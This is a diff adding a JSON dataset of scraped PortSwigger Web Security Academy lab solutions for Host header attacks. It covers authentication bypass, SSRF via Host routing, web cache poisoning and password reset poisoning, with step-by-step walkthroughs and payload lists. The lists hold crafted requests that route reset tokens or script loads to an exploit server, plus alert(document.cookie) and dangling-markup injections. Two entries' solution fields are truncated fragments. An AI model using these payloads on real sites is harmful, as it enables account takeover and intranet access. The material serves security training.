@@ -1,0 +1,194 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass",
+    "category": "host-header",
+    "title": "Host header authentication bypass",
+    "description": "This lab makes an assumption about the privilege level of the user based on the HTTP Host header.",
+    "solution_steps": [
+      "Send the GET / request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.",
+      "Browse to /robots.txt and observe that there is an admin panel at /admin .",
+      "Try and browse to /admin . You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.",
+      "Send the GET /admin request to Burp Repeater.",
+      "In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.",
+      "Change the request line to GET /admin/delete?username=carlos and send the request to delete carlos to solve the lab."
+    ],
+    "solution": "1. Send the GET / request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.\n2. Browse to /robots.txt and observe that there is an admin panel at /admin .\n3. Try and browse to /admin . You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.\n4. Send the GET /admin request to Burp Repeater.\n5. In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.\n6. Change the request line to GET /admin/delete?username=carlos and send the request to delete carlos to solve the lab.",
+    "payloads": [
+      "carlos",
+      "GET /",
+      "/robots.txt",
+      "/admin",
+      "GET /admin",
+      "localhost",
+      "GET /admin/delete?username=carlos"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack",
+    "category": "host-header",
+    "title": "Host validation bypass via connection state attack",
+    "description": "This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.",
+    "solution": "Solving this lab requires features first released in\nBurp Suite 2022.8.1\n.",
+    "payloads": [
+      "192.168.0.1/admin",
+      "carlos",
+      "GET /",
+      "/admin",
+      "Host",
+      "192.168.0.1",
+      "YOUR-LAB-ID.h1-web-security-academy.net",
+      "Connection",
+      "keep-alive",
+      "/admin/delete",
+      "username",
+      "csrf",
+      "POST /admin/delete HTTP/1.1\nHost: 192.168.0.1\nCookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE\nContent-Type: x-www-form-urlencoded\nContent-Length: CORRECT\n\ncsrf=YOUR-CSRF-TOKEN&username=carlos"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf",
+    "category": "host-header",
+    "title": "Routing-based SSRF",
+    "description": "This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.",
+    "solution_steps": [
+      "Send the GET / request that received a 200 response to Burp Repeater.",
+      "In Burp Repeater, select the Host header value, right-click and select Insert Collaborator payload to replace it with a Collaborator domain name. Send the request.",
+      "Go to the Collaborator tab and click Poll now . You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.",
+      "Send the GET / request to Burp Intruder.",
+      "Go to Intruder .",
+      "Deselect Update Host header to match target .",
+      "Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: Host: 192.168.0.\u00a70\u00a7",
+      "In the Payloads side panel, select the payload type Numbers . Under Payload configuration , enter the following values: From: 0\nTo: 255\nStep: 1",
+      "Click Start attack . A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.",
+      "When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to /admin . Send this request to Burp Repeater.",
+      "In Burp Repeater, change the request line to GET /admin and send the request. In the response, observe that you have successfully accessed the admin panel.",
+      "Study the form for deleting users. Notice that it will generate a POST request to /admin/delete with both a CSRF token and username parameter. You need to manually craft an equivalent request to delete carlos .",
+      "Change the path in your request to /admin/delete . Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos . The request line should now look like this but with a different CSRF token: GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos",
+      "Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.",
+      "Right-click on your request and select Change request method . Burp will convert it to a POST request.",
+      "Send the request to delete carlos and solve the lab."
+    ],
+    "solution": "1. Send the GET / request that received a 200 response to Burp Repeater.\n2. In Burp Repeater, select the Host header value, right-click and select Insert Collaborator payload to replace it with a Collaborator domain name. Send the request.\n3. Go to the Collaborator tab and click Poll now . You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.\n4. Send the GET / request to Burp Intruder.\n5. Go to Intruder .\n6. Deselect Update Host header to match target .\n7. Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: Host: 192.168.0.\u00a70\u00a7\n8. In the Payloads side panel, select the payload type Numbers . Under Payload configuration , enter the following values: From: 0\nTo: 255\nStep: 1\n9. Click Start attack . A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.\n10. When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to /admin . Send this request to Burp Repeater.\n11. In Burp Repeater, change the request line to GET /admin and send the request. In the response, observe that you have successfully accessed the admin panel.\n12. Study the form for deleting users. Notice that it will generate a POST request to /admin/delete with both a CSRF token and username parameter. You need to manually craft an equivalent request to delete carlos .\n13. Change the path in your request to /admin/delete . Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos . The request line should now look like this but with a different CSRF token: GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos\n14. Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.\n15. Right-click on your request and select Change request method . Burp will convert it to a POST request.\n16. Send the request to delete carlos and solve the lab.",
+    "payloads": [
+      "192.168.0.0/24",
+      "carlos",
+      "GET /",
+      "Host: 192.168.0.\u00a70\u00a7",
+      "From: 0\nTo: 255\nStep: 1",
+      "/admin",
+      "GET /admin",
+      "POST",
+      "/admin/delete",
+      "username",
+      "GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos",
+      "Set-Cookie"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing",
+    "category": "host-header",
+    "title": "SSRF via flawed request parsing",
+    "description": "This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.",
+    "solution_steps": [
+      "Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.",
+      "Observe that you can also access the home page by supplying an absolute URL in the request line as follows: GET https://YOUR-LAB-ID.web-security-academy.net/",
+      "Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.",
+      "Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server: GET https://YOUR-LAB-ID.web-security-academy.net/\nHost: BURP-COLLABORATOR-SUBDOMAIN",
+      "Right-click and select Insert Collaborator payload to insert a Burp Collaborator subdomain where indicated in the request.",
+      "Send the request containing the absolute URL to Burp Intruder.",
+      "Go to Intruder and deselect Update Host header to match target .",
+      "Use the Host header to scan the IP range 192.168.0.0/24 to identify the IP address of the admin interface. Send this request to Burp Repeater.",
+      "In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.",
+      "Change the absolute URL in your request to point to /admin/delete . Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos . The request line should now look like this but with a different CSRF token: GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos",
+      "Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.",
+      "Right-click on your request and select \"Change request method\". Burp will convert it to a POST request.",
+      "Send the request to delete carlos and solve the lab."
+    ],
+    "solution": "1. Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.\n2. Observe that you can also access the home page by supplying an absolute URL in the request line as follows: GET https://YOUR-LAB-ID.web-security-academy.net/\n3. Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.\n4. Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server: GET https://YOUR-LAB-ID.web-security-academy.net/\nHost: BURP-COLLABORATOR-SUBDOMAIN\n5. Right-click and select Insert Collaborator payload to insert a Burp Collaborator subdomain where indicated in the request.\n6. Send the request containing the absolute URL to Burp Intruder.\n7. Go to Intruder and deselect Update Host header to match target .\n8. Use the Host header to scan the IP range 192.168.0.0/24 to identify the IP address of the admin interface. Send this request to Burp Repeater.\n9. In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.\n10. Change the absolute URL in your request to point to /admin/delete . Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos . The request line should now look like this but with a different CSRF token: GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos\n11. Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.\n12. Right-click on your request and select \"Change request method\". Burp will convert it to a POST request.\n13. Send the request to delete carlos and solve the lab.",
+    "payloads": [
+      "192.168.0.0/24",
+      "carlos",
+      "GET /",
+      "GET https://YOUR-LAB-ID.web-security-academy.net/",
+      "GET https://YOUR-LAB-ID.web-security-academy.net/\nHost: BURP-COLLABORATOR-SUBDOMAIN",
+      "/admin",
+      "/admin/delete",
+      "username",
+      "GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos",
+      "Set-Cookie",
+      "POST"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests",
+    "category": "host-header",
+    "title": "Web cache poisoning via ambiguous requests",
+    "description": "This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page.",
+    "solution_steps": [
+      "In Burp's browser, open the lab and click Home to refresh the home page.",
+      "In Proxy > HTTP history , right-click the GET / request and select Send to Repeater .",
+      "In Repeater, study the lab's behavior. Notice that the website validates the Host header. If you modify the Host header, you can no longer access the home page.",
+      "In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123 . You can change this parameter each time you want a fresh response from the back-end server.",
+      "Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js .",
+      "Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.",
+      "Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie) . Store the exploit and copy the domain name for your exploit server.",
+      "Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this: GET /?cb=123 HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the alert() fires.",
+      "In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page."
+    ],
+    "solution": "1. In Burp's browser, open the lab and click Home to refresh the home page.\n2. In Proxy > HTTP history , right-click the GET / request and select Send to Repeater .\n3. In Repeater, study the lab's behavior. Notice that the website validates the Host header. If you modify the Host header, you can no longer access the home page.\n4. In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123 . You can change this parameter each time you want a fresh response from the back-end server.\n5. Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js .\n6. Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.\n7. Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie) . Store the exploit and copy the domain name for your exploit server.\n8. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this: GET /?cb=123 HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n9. Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the alert() fires.\n10. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.",
+    "payloads": [
+      "alert(document.cookie)",
+      "GET /",
+      "GET /?cb=123",
+      "/resources/js/tracking.js",
+      "GET /?cb=123 HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning",
+    "category": "host-header",
+    "title": "Basic password reset poisoning",
+    "description": "This lab is vulnerable to password reset poisoning. The usercarloswill carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.",
+    "solution_steps": [
+      "Go to the login page and notice the \"Forgot your password?\" functionality. Request a password reset for your own account.",
+      "Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter temp-forgot-password-token .",
+      "Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.",
+      "In Burp, study the HTTP history. Notice that the POST /forgot-password request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.",
+      "In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.",
+      "Back in Burp Repeater, change the Host header to your exploit server's domain name ( YOUR-EXPLOIT-SERVER-ID.exploit-server.net ) and change the username parameter to carlos . Send the request.",
+      "Go to your exploit server and open the access log. You will see a request for GET /forgot-password with the temp-forgot-password-token parameter containing Carlos's password reset token. Make a note of this token.",
+      "Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.",
+      "Change Carlos's password to whatever you want, then log in as carlos to solve the lab."
+    ],
+    "solution": "1. Go to the login page and notice the \"Forgot your password?\" functionality. Request a password reset for your own account.\n2. Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter temp-forgot-password-token .\n3. Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.\n4. In Burp, study the HTTP history. Notice that the POST /forgot-password request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.\n5. In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.\n6. Back in Burp Repeater, change the Host header to your exploit server's domain name ( YOUR-EXPLOIT-SERVER-ID.exploit-server.net ) and change the username parameter to carlos . Send the request.\n7. Go to your exploit server and open the access log. You will see a request for GET /forgot-password with the temp-forgot-password-token parameter containing Carlos's password reset token. Make a note of this token.\n8. Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.\n9. Change Carlos's password to whatever you want, then log in as carlos to solve the lab.",
+    "payloads": [
+      "carlos",
+      "wiener:peter",
+      "temp-forgot-password-token",
+      "POST /forgot-password",
+      "YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "username",
+      "GET /forgot-password"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup",
+    "category": "host-header",
+    "title": "Password reset poisoning via dangling markup",
+    "description": "This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.",
+    "solution": "Some antivirus software scans links in emails to identify whether they are malicious.",
+    "payloads": [
+      "wiener:peter",
+      "GET /email",
+      "DOMPurify",
+      "POST /forgot-password",
+      "Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport",
+      "Host: YOUR-LAB-ID.web-security-academy.net:'<a href=\"//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?",
+      "GET /?/login'>[\u2026]",
+      "username",
+      "carlos"
+    ]
+  }
+]
